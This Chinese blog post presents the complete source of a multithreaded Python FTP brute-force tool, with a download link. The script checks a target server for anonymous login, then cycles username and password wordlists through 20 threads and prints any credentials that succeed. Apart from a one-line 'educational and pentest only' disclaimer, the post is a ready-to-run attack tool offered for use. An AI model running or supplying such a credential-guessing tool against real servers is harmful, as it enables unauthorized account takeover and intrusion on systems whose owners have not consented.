---
title: 一款Python多线程-FTP暴力破解工具
date: 2018-07-12 14:32:01
tags:
	- Python
	- 工具
	- 爆破
	- FTP
categories: 工具
---
仿土司上一位老哥写的FTP爆破工具，修复了一些BUG，添加了多线程。
![](http://image.ixysec.com/python/image/ftpbrute.png)<!-- more -->

``` python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

import sys
import os
import time
import threading
from queue import Queue
from ftplib import FTP


docs = """
        [*] This was written for educational purpose and pentest only. Use it at your own risk.
        [*] Author will be not responsible for any damage!
        [*] Toolname        : ftp_brute_laot.py
        [*] Coder           : 
        [*] Version         : 0.1
        [*] ample of use  : python ftp_brute_laot.py -t ftp.server.com -u usernames.txt -p passwords.txt
        """

if sys.platform == 'linux' or sys.platform == 'linux2':
    clearing = 'clear'
else:
    clearing = 'cls'
os.system(clearing)

R = "\033[31m"
G = "\033[32m"
Y = "\033[33m"
END = "\033[0m"


def logo():
    print(G + "\n                |---------------------------------------------------------------|")
    print("                |                                                               |")
    print("                |                           www.ixysec.com                      |")
    print("                |                11/07/2018 ftp_brute_laot.py v.0.1             |")
    print("                |                        FTP Brute Forcing Tool                 |")
    print("                |                                                               |")
    print("                |---------------------------------------------------------------|\n")
    print("        \n                 [-] %s\n" % time.strftime("%X"))
    print(docs + END)

def xhelp():
    print(R + "[*]-t, --target            ip/hostname     <> Our target")
    print("[*]-u, --usernamelist      usernamelist    <> usernamelist path")
    print("[*]-p, --passwordlist      passwordlist    <> passwordlist path")
    print("[*]-h, --help              help            <> print this help")
    print("[*]Example : python ftp_bf -h ftp.server.com -u username.txt -p passwords.txt" + END)
    sys.exit(1)

def brute_login(host):
    global q
    global flag
    try:
        if not q.empty():
            user, pwd = q.get()
        ftp = FTP(host)
        ftp.login(user, pwd)
        ftp.retrlines('list')
        ftp.quit()
        print(Y + "\n[!] w00t,w00t!!! We did it ! ")
        print("[+] Target : ", host, "")
        print("[+] User : ", user, "")
        print("[+] Password : ", pwd, "" + END)
        flag = 1
        return 1
    except Exception:
        print(G + "[+]Attempt uaername:%s password:%s..." % (user, pwd) + R + "Disenable" + END)
    except KeyboardInterrupt:
        print(R + "\n[-] Exiting ...\n" + END)
        sys.exit(1)

def anonymous_login(host):
    try:
        print(G + "\n[!] Checking for anonymous login.\n" + END)
        ftp = FTP(host)
        ftp.login()
        ftp.retrlines("list")
        print(Y + "\n[!] w00t,w00t!!! Anonymous login successfuly !\n" + END)
        sys.exit(0)
    except Exception:
        print(R + "\n[-] Anonymous login failed...\n" + END)


q = Queue()
flag = 0
def main():
    global q
    logo()
    # ftp_brute.py -h 127.0.0.1 -p password.txt -u username.txt
    # ['ftp_brute.py', '-h', '127.0.0.1', '-p', 'password.txt', '-u', 'username.txt']
    # print(sys.argv)
    try:
        for argv in sys.argv:
            if argv.lower() == "-t" or argv.lower() == "--target":
                host = sys.argv[sys.argv.index(argv) + 1]
                # print(host)
            elif argv.lower() == "-u" or argv.lower() == "--usernamelist":
                usernamelist = sys.argv[sys.argv.index(argv) + 1]
                # print(usernamelist)
            elif argv.lower() == "-p" or argv.lower() == "--passwordlist":
                passwordlist = sys.argv[sys.argv.index(argv) + 1]
                # print(passwordlist)
            elif argv.lower() == "-h" or argv.lower() == "--help":
                xhelp()
            elif len(sys.argv) <= 1:
                xhelp()
    except SystemExit:
        print(R+"[-]Cheak your parametars input\n"+END)
        sys.exit(0)
    except Exception:
        xhelp()
        print(R+"[-]Cheak your parametars input\n"+END)

    print(G + "[!] BruteForcing target ..." + END)
    anonymous_login(host)

    try:
        usernames = open(usernamelist, "r")
        user = usernames.readlines()
        for i in range(len(user)):
            user[i] = user[i].strip()
    except Exception:
        print(R + "\n[-] Cheak your usernamelist path\n" + END)
        sys.exit(1)

    try:
        passwords = open(passwordlist, "r")
        pwd = passwords.readlines()
        for i in range(len(pwd)):
            pwd[i] = pwd[i].strip()
    except Exception:
        print(R + "\n[-] Cheak your passwordlist path\n" + END)
        sys.exit(1)

    print(G + "\n[+] Loaded:", len(user), "usernames")
    print("\n[+] Loaded:", len(pwd), "passwords")
    print("[+] Target:", host)
    print("[+] Guessing...\n" + END)

    for u in user:
        for p in pwd:
            # result = brute_login(host, u.replace("\n", ""), p.replace("\n", ""))
            # if result != 1:
            #     print(G + "[+]Attempt uaername:%s password:%s..." % (u, p) + R + "Disenable" + END)
            # else:
            #     print(G + "[+]Attempt uaername:%s password:%s..." % (u, p) + Y + "Enable" + END)
            #     flag = 1
            #     break
            q.put([u, p])

    threadlist = []
    while True:
        # print("----%d----"%len(threadlist))

        if q.empty():
            break
        elif flag == 1:
            break
        elif len(threadlist) < 20:
            t = threading.Thread(target=brute_login, args=(host,))
            t.start()
            threadlist.append(t)
        elif len(threadlist) >= 20:
            for th in threadlist:
                th.join()
                threadlist.remove(th)

    # 等所有线程结束
    for t in threadlist:
        t.join()
    if not flag:
        print(R + "\n[-]There is no username ans password enabled in the list.")
        print("[-]Exiting...\n" + END)



if __name__ == "__main__":
    main()
```

下载地址：[点我下载](http://image.ixysec.com/file/ftp_brute.rar)